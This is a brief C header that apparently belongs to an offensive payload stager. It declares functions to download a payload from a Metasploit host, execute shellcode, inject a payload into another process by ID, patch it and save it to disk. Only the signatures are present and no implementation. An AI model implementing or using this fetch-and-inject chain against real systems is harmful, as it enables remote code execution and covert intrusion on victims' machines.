#pragma once

int LoadHTTPPayload(const char *metasploit_host, int metasploit_port);
void ExecuteShellcode(LPVOID exeBuffer);
int InjectPayload(LPVOID exeBuffer, DWORD exeLength, DWORD processId);
int PatchPayload(LPSTR exeBuffer, DWORD exeLength);
int SavePayload(const char *FileName, LPSTR exeBuffer, DWORD exeLength);